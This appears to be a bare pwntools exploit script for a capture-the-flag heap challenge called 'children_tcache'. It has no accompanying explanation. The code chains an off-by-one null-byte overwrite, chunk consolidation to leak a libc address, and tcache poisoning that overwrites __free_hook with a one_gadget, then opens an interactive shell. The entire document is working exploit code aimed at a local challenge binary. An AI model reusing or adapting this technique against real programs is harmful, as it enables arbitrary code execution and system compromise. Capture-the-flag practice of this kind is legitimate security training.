from pwn import*

context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']

p = process('./children_tcache')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def new(size,content):
    p.recv()
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(size))
    p.recvuntil(":")
    p.sendline(content)
    
def free(idx):
    p.recv()
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(str(idx))
    
def put(idx):
    p.recv()
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(idx))
    


new(0x410,"a")
new(0x28,"a"*0x28)
new(0x5f0,"a")
new(0x20,"a")

free(0)
free(1)

#clear chunk_2 prev_size and prev_inuse
for i in range(9):
    new(0x28-i,"a"*(0x28-i))
    free(0)
 
new(0x28,"a"*0x20 + p64(0x420+0x30)) #0
free(2) #trigger unlink
new(0x410,"a") #1 
put(0)  

leak = u64(p.recv(8)[:6].ljust(8,'\x00')) 
libc_base = leak - libc.symbols['__malloc_hook'] - 0x10 - 88
libc.address = libc_base
free_hook = libc.symbols['__free_hook']
one_gadget = 0xfccde + libc_base
log.info("libc_base {}".format(hex(libc_base)))

new(0x28,"\n") #2
free(0)
free(2)

new(0x28,p64(free_hook))
new(0x28,"\n")
new(0x28,p64(one_gadget))

free(1)
p.interactive()

